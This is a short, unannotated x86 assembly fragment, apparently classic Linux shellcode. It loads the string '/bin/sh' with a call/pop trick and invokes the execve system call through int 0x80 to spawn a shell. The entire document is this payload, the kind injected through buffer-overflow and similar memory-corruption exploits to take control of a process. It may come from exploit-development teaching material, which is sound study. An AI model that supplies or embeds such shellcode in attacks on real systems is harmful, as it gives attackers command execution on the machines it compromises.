call func
.string "/bin/sh"
func:
pop ebx
mov eax, 11
mov ecx, 0
mov edx, 0
int 0x80
